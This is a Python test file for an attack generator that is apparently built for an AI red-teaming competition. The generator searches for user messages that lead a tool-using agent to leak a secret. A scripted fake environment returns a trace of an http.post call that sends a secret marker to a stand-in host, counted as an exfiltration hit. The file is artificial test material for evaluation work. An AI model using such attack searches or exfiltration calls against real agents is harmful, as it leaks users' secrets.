from attack import AttackAlgorithm, _valid_candidate
from aicomp_sdk.attacks import AttackRunConfig


class _FakeEnv:
    """Minimal env satisfying the protocol read by run()."""

    def __init__(self):
        self.seed = 123

    def reset(self, *a, **k):
        pass

    def interact(self, msg, max_tool_hops=None):
        return None

    def export_trace_dict(self):
        return {"tool_events": [], "user_messages": [], "egress": [], "seed": 123}

    def snapshot(self):
        return None

    def restore(self, s):
        pass


def test_run_returns_list_of_candidates():
    result = AttackAlgorithm().run(_FakeEnv(), AttackRunConfig(time_budget_s=1))
    assert isinstance(result, list)


import base64
from attack import AttackAlgorithm, SECRET_MARKER


class _ScriptedEnv:
    """Env whose every export_trace_dict returns a trace that triggers EXFILTRATION,
    but with a distinct user message each interact (so Phase 2 finds distinct hits)."""

    def __init__(self):
        self.seed = 123
        self._n = 0

    def reset(self, *a, **k):
        pass

    def interact(self, msg, max_tool_hops=None):
        self._n += 1
        return None

    def export_trace_dict(self):
        return {
            "tool_events": [{
                "name": "http.post", "ok": True, "side_effect": "SHARE",
                "source": "tool",
                "args": {"url": f"https://report.example.org/log", "data": SECRET_MARKER},
            }],
            "user_messages": [f"probe {self._n}"],   # distinct per call
            "egress": [], "seed": 123,
        }

    def snapshot(self):
        return None

    def restore(self, s):
        pass


def test_phase2_appends_live_hits_and_dedups():
    algo = AttackAlgorithm({"search_enabled": True})
    seed = []  # nothing from Phase 1
    hits = algo._phase2(_ScriptedEnv(), budget_s=0.5, hops=8, seed_candidates=seed)
    assert len(hits) >= 1
    # all distinct
    msgs = [c.user_messages for c in hits]
    assert len(msgs) == len(set(msgs))


def test_phase2_respects_margin_and_terminates():
    algo = AttackAlgorithm({"search_enabled": True})
    # tiny budget -> must still terminate quickly (margin respected)
    hits = algo._phase2(_ScriptedEnv(), budget_s=0.3, hops=8, seed_candidates=[])
    assert isinstance(hits, list)


def test_phase2_dedups_against_seed_candidates():
    algo = AttackAlgorithm({"search_enabled": True})
    from aicomp_sdk.attacks import AttackCandidate
    seed = [AttackCandidate(user_messages=("probe 1",))]  # will collide with first hit
    hits = algo._phase2(_ScriptedEnv(), budget_s=0.5, hops=8, seed_candidates=seed)
    assert ("probe 1",) not in [c.user_messages for c in hits]


from attack import _phase1, _finalize, family_a_candidates, clean_urls, MAX_CANDIDATES, is_clean


def test_clean_pool_yields_600_distinct_clean_urls():
    urls = clean_urls(600)
    assert len(urls) == 600
    assert len(set(urls)) == 600
    assert all(is_clean(u) for u in urls)


def test_phase1_assembles_best_first_all_valid():
    cands = _phase1()
    assert 100 <= len(cands) <= MAX_CANDIDATES
    for c in cands:
        assert _valid_candidate(c.user_messages)


def test_phase1_dense_family_a_comes_first():
    cands = _phase1()
    # first candidates are Family A density-8 (each names ~8 urls)
    first_msg = cands[0].user_messages[0]
    # count how many distinct clean urls appear in the first message
    urls = clean_urls(300)
    n_in_first = sum(1 for u in urls if u in first_msg)
    assert n_in_first >= 4  # a dense multi-post message


def test_finalize_dedups_and_caps():
    from aicomp_sdk.attacks import AttackCandidate
    a = AttackCandidate(user_messages=("same",))
    b = AttackCandidate(user_messages=("same",))
    c = AttackCandidate(user_messages=("other",))
    out = _finalize([a, b, c])
    assert [x.user_messages for x in out] == [("same",), ("other",)]

    many = [AttackCandidate(user_messages=(f"m{i}",)) for i in range(MAX_CANDIDATES + 50)]
    out2 = _finalize(many)
    assert len(out2) == MAX_CANDIDATES


def test_run_full_pipeline_against_fake_env():
    algo = AttackAlgorithm({"search_enabled": False})  # isolate Phase 1
    result = algo.run(_FakeEnv(), AttackRunConfig(time_budget_s=1))
    assert 100 <= len(result) <= MAX_CANDIDATES
    assert len({c.user_messages for c in result}) == len(result)  # no dups
